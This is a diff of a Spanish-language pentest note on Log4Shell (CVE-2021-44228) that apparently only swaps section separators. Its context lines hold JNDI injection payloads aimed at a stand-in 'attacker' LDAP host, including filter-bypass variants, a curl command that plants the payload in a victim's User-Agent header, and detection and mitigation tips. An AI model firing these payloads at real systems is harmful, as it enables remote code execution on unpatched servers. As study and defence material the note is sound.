@@ -15,7 +15,7 @@ linked:
 > [!info]
 > **Log4Shell** (CVE-2021-44228) — RCE pre-auth en log4j 2.0-2.14.1 via JNDI injection. Cualquier string logged que contenga la expresión JNDI triggea lookup → carga clase Java arbitraria.
 
-***
+---
 
 ## Vector
 
@@ -29,7 +29,7 @@ Inputs típicos a injectar:
 - Username en login attempt
 - Cualquier search/filter param
 
-***
+---
 
 ## Payload básico
 
@@ -40,7 +40,7 @@ Variantes para bypass de filtros simples:
 - `${${lower:j}ndi:ldap://attacker/x}`
 - `${jndi:${lower:l}${lower:d}${lower:a}p://attacker/x}`
 
-***
+---
 
 ## Setup attacker
 
@@ -56,7 +56,7 @@ python3 -m http.server 8888
 curl 'http://victim/' -H 'User-Agent: $JNDI_PAYLOAD'
 ```
 
-***
+---
 
 ## Detección
 
@@ -66,7 +66,7 @@ curl 'http://victim/' -H 'User-Agent: $JNDI_PAYLOAD'
 | **log4j-scan** (FullHunt) | `python3 log4j-scan.py -u http://target/` |
 | **DNSLog OOB** | Replace ldap con `${jndi:ldap://uniqueid.dnslog.cn/x}` y observar |
 
-***
+---
 
 ## Mitigation
 
@@ -74,7 +74,7 @@ curl 'http://victim/' -H 'User-Agent: $JNDI_PAYLOAD'
 - Stop-gap: `log4j2.formatMsgNoLookups=true`, env var `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`.
 - WAF rules bloqueando `${jndi:`.
 
-***
+---
 
 ## Notas Relacionadas
 
